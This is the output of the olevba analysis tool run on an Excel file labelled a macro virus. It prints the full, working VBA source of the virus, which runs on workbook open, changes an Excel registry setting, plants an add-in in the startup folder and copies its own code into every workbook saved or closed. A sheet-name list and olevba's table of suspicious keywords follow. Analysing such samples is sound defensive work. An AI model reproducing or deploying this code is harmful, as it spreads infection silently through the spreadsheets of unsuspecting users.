olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Explicit



Private Const cstrSection     As String = "Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
Private Const cstrEngine      As String = "BASE5874.XLS"
Private Const cstrModule      As String = "ThisWorkbook"
Private Const cstrKeyName     As String = "Options6"
Private Const cstrVolumeData  As String = "IVID"

Private Declare Function GetVolumeInformation Lib "KERNEL32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As Long, ByVal nVolumeNameSize As Long, lpVolumeSerialNumber As Long, lpMaximumComponentLength As Long, lpFileSystemFlags As Long, ByVal lpFileSystemNameBuffer As Long, ByVal nFileSystemNameSize As Long) As Long
Private Declare Function RegCloseKey Lib "ADVAPI32.DLL" (ByVal hKey As Long) As Long
Private Declare Function RegOpenKeyEx Lib "ADVAPI32.DLL" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "ADVAPI32.DLL" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Private Declare Function RegSetValueEx Lib "ADVAPI32.DLL" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long

Private WithEvents mapp As Application
Attribute mapp.VB_VarHelpID = -1




Private Sub Workbook_Open()
  Dim strEngine     As String
  Dim wbkEngine     As Workbook
  Dim cmdEngine     As Object
  Dim lngRegKey     As Long
  Dim lngRegType    As Long
  Dim lngRegValue   As Long
  Dim lngVolumeID   As Long
  On Error Resume Next
  If (RegOpenKeyEx(&H80000001, cstrSection, 0, &H2001F, lngRegKey) = 0) Then
    RegQueryValueEx lngRegKey, cstrKeyName, 0, lngRegType, lngRegValue, 4
    RegSetValueEx lngRegKey, cstrKeyName, 0, lngRegType, lngRegValue And Not 8, 4
    RegCloseKey lngRegKey
  End If
  strEngine = UCase$(Application.StartupPath + "\" + cstrEngine)
  If UCase$(Me.FullName) = strEngine Then
    Set mapp = Application
  ElseIf Len(Dir(strEngine)) = 0 Then
    Application.ScreenUpdating = False
    If Len(Dir(Application.StartupPath, vbDirectory)) = 0 Then MkDir Application.StartupPath
    Set wbkEngine = Workbooks.Add
    wbkEngine.IsAddin = True
    Intrude wbkEngine
    GetVolumeInformation Left$(strEngine, InStr(1, strEngine, "\")), 0, 0, lngVolumeID, 0, 0, 0, 0
    wbkEngine.CustomDocumentProperties.Add cstrVolumeData + Hex$(lngVolumeID), False, msoPropertyTypeString, ""
    wbkEngine.SaveAs strEngine, xlAddIn
    wbkEngine.Close
    If (lngRegValue And 8) = 8 Then
      Set cmdEngine = Me.VBProject.VBComponents(cstrModule).CodeModule
      cmdEngine.DeleteLines 1, cmdEngine.CountOfLines
      Me.Save
    End If
    Application.ScreenUpdating = True
  Else
    CopyVolumesData Workbooks(cstrEngine)
  End If
End Sub

Private Sub mapp_WorkbookBeforeSave(ByVal Wb As Excel.Workbook, ByVal SaveAsUI As Boolean, Cancel As Boolean)
  On Error Resume Next
  Intrude Wb
End Sub

Private Sub mapp_WorkbookBeforeClose(ByVal Wb As Excel.Workbook, Cancel As Boolean)
  On Error Resume Next
  If Len(Wb.Path) <> 0 Then If Intrude(Wb) Then Wb.Save
End Sub

Private Function Intrude(wbkTarget As Workbook) As Boolean
  Dim cmdSource As Object
  Dim cmdTarget As Object
  On Error Resume Next
  Intrude = False
  Set cmdSource = Me.VBProject.VBComponents(cstrModule).CodeModule
  Set cmdTarget = wbkTarget.VBProject.VBComponents(cstrModule).CodeModule
  If cmdTarget.CountOfLines <= 2 Then
    cmdTarget.DeleteLines 1, cmdSource.CountOfLines
    cmdTarget.AddFromString cmdSource.Lines(1, cmdSource.CountOfLines)
    CopyVolumesData wbkTarget
    Intrude = True
  End If
End Function

Private Sub CopyVolumesData(wbkTarget As Workbook)
  Dim pptVolume As DocumentProperty
  On Error Resume Next
  For Each pptVolume In Me.CustomDocumentProperties
    If Left$(pptVolume.Name, Len(cstrVolumeData)) = cstrVolumeData Then
      wbkTarget.CustomDocumentProperties.Add pptVolume.Name, False, pptVolume.Type, ""
      wbkTarget.CustomDocumentProperties(pptVolume.Name).Value = pptVolume.Value
    End If
  Next
End Sub
-------------------------------------------------------------------------------
VBA MACRO Foaie1.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie2.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie3.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie4.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie5.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie6.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie7.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie8.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie9.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie10.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie10'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie11.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie12.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie13.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie13'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie14.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie14'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie15.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie15'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie16.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie16'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie17.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie17'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie18.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie18'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie19.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie19'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie20.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie20'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie21.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie21'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie22.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie22'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie23.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie23'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie24.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie24'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie25.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie25'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie26.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie26'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie27.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie27'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie28.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie28'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie29.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie29'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie30.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie30'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie31.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie31'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie32.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie32'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie33.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie33'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie34.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie34'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie35.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie35'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foaie36.cls 
in file: Virus.MSExcel.Tracker-based-707288bce46209e01da5989a82bfd87f508e43b5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Foaie36'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  SOLDUR
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  ANCORA
' 0085     20 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  DRDP CRAIOV
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  PLD
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  HIDROCONS
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  SLUTERE
' 0085     24 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  STAICONS COMPAN
' 0085     24 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  GRASETTO LAVORI
' 0085     25 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  PROODEFTIKI ATEN
' 0085     24 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  PRIMARIA CALAFA
' 0085     21 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  OLTANA MONTA
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  ELPREC
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  LIANTU
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  ERPIA S
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  DSC TG.JI
' 0085     17 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  DOMARCON
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  IZOCO
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  CM1 S
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  PLASTIDRU
' 0085     17 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  CONSORTI
' 0085     19 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  SC IDP GOR
' 0085     23 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  GENERAL COMI S
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  SC PROHAU
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  SC TCIF S
' 0085     19 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  PERS FIZIC
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  ADIDRA
' 0085     17 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  ROVIMCOM
' 0085     17 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  TERMOSER
' 0085     20 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  TOTAL INSTA
' 0085     30 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  SCT SA BUC SDP CRAIOV
' 0085     27 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  SC DLP SA MEHEDINT
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  SC STRABA
' 0085     26 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  SC ENIMON PROD SR
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  PROCEZARO
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  VIARO
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  SOROCA
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegOpenKeyEx        |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|RegQueryValueExA    |May read registry keys                       |
|Suspicious|RegQueryValueEx     |May read registry keys                       |
|Suspicious|GetVolumeInformation|May detect Anubis Sandbox                    |
|          |A                   |                                             |
|Suspicious|GetVolumeInformation|May detect Anubis Sandbox                    |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |ADVAPI32.DLL        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

